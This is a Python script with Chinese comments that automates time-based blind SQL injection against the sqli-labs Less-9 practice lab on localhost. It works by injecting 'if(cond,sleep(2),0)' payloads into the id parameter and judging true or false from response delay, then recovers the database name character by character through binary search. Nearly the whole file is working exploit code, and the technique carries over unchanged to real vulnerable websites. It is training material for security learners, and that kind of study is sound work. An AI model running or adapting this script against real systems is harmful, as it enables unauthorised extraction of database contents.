"""
时间盲注自动化取数脚本（sqli-labs Less-9）

与 function3-8.py（布尔盲注）的唯一区别：
    Less-8 的判断依据 = 页面长度   →  return len(r.text) == len(a.text)
    Less-9 的判断依据 = 响应耗时   →  return cost > BASE + 1.5

原理：
    本关页面既无回显也无报错，连"真假两种页面"都没有，只剩"等了多久"这一个信号。
    用 if(条件, sleep(2), 0) 把"条件真假"转换成"是否延时"，再靠耗时判断。

注意：延时不能直接写在 and 后面（and sleep(2) 无论条件真假都会延时），
     必须用 if(条件, sleep(2), 0) 包起来，让延时只在条件为真时发生。

判断基线必须先实测：本环境正常请求约 2 秒（PHP + MySQL 渲染耗时），
     所以不能用绝对时间（如"超过 3 秒算真"），必须用"比基线慢多少"。
"""

import time
import requests

URL = "http://127.0.0.1/sqli-labs-master/Less-9/"

SLEEP = 2          # 每次延时的秒数
MARGIN = 1.5       # 比基线慢多少秒算"延时生效"
BASE = 0.0         # 基线耗时，启动时实测

session = requests.Session()


def measure_base(times=3):
    """量基线：连续请求几次取平均，避免偶发抖动"""
    global BASE
    total = 0.0
    for _ in range(times):
        t = time.time()
        session.get(URL + "?id=1")
        total += time.time() - t
    BASE = total / times
    print(f"基线耗时 = {BASE:.2f} 秒（{times} 次平均）")
    return BASE


def boole(cond):
    """发一次请求，条件为真则页面被 sleep 拖慢 → 返回 True"""
    t = time.time()
    session.get(URL + f"?id=1' and if({cond},sleep({SLEEP}),0)--+")
    cost = time.time() - t
    return cost > BASE + MARGIN


def find_length(target):
    """二分法猜长度"""
    low, high = 0, 100
    while low < high:
        mid = (low + high) // 2
        if boole(f"length(({target}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def find_ascii(pos, target):
    """二分法猜第 pos 个字符的 ASCII 码"""
    low, high = 0, 127
    while low < high:
        mid = (low + high) // 2
        if boole(f"ascii(substr(({target}),{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def dump(target, label):
    """完整爆一个字符串"""
    print(f"\n--- 爆破：{label} ---")
    n = find_length(target)
    print(f"长度 = {n}")
    if n == 0 or n > 90:
        print("长度异常，目标可能不存在")
        return ""

    d = ''
    for c in range(1, n + 1):
        d = d + chr(find_ascii(c, target))
        print(f"  {d}")
    return d


if __name__ == "__main__":
    started = time.time()

    measure_base()

    # 自检：判断函数是否可靠
    print("\n判断函数自检：")
    print("  1=1 应为 True  →", boole("1=1"))
    print("  1=2 应为 False →", boole("1=2"))

    # 爆库名
    name = dump("database()", "库名")

    print(f"\n{'=' * 50}")
    print(f"库名 = {name}")
    print(f"总耗时 {time.time() - started:.1f} 秒")
    print("=" * 50)
